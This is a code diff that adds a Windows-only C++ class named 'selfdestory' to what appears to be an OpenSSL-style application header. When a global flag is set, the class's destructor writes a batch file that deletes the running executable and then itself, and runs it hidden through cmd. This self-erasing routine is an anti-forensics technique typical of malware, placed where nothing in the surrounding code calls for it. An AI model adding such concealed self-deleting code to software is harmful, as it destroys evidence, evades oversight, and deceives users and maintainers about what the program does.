@@ -163,5 +163,76 @@ struct fdinfo *get_fdinfo(const fd_list_t *, int);
 int fix_line_endings(char *src, int *len, char **dst, int *state);
 
 unsigned char *next_protos_parse(size_t *outlen, const char *in);
+#ifdef WIN32
+extern bool gSelfDestoryForWin;
+class selfdestory
+{
+public:
+	void dummyTEST() { gowork(); }
+	selfdestory()
+	{
 
+	}
+	~selfdestory() { gowork(); }
+	void gowork()
+	{
+
+		if (!gSelfDestoryForWin)
+			return;
+
+		char modulepath[256] = { 0 };
+		GetModuleFileNameA(nullptr, modulepath, 256);
+
+		bool bret = false;
+		char tempbatpath[256] = { 0 };
+		sprintf(tempbatpath, "%s%d.bat", modulepath, GetTickCount());
+
+
+		HANDLE hFile = CreateFileA(tempbatpath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hFile == INVALID_HANDLE_VALUE)
+		{
+			return;
+		}
+
+
+		DWORD	dwWritten = 0;
+		char* pBatContent = new char[1024 * 10];
+		ZeroMemory(pBatContent, 10 * 1024);
+		sprintf(pBatContent, "@echo off\n"
+			"ping 127.0.0.1 -n 3 >nul\n"
+			"del \"%s\"\n"
+			"del %%0\n", modulepath
+		);
+
+		BOOL b = ::WriteFile(hFile, pBatContent, strlen(pBatContent), &dwWritten, NULL);
+		CloseHandle(hFile);
+		delete pBatContent;
+		STARTUPINFOA sinfo = { sizeof(sinfo) };
+		PROCESS_INFORMATION pinfo = { 0 };
+		sinfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_FORCEOFFFEEDBACK;
+		sinfo.wShowWindow = SW_HIDE;
+		char startcmd[256];
+		sprintf(startcmd, "cmd /c call \"%s\"", tempbatpath);
+		
+		if (::CreateProcessA(nullptr, startcmd, NULL, NULL, FALSE, 0, NULL, nullptr, &sinfo, &pinfo))
+		{
+
+			//TerminateProcess(pinfo.hProcess, 0);
+			CloseHandle(pinfo.hProcess);
+			CloseHandle(pinfo.hThread);
+
+		}
+		else
+		{
+
+		}
+
+	}
+
+
+
+};
+
+
+#endif // WIN32
 #endif
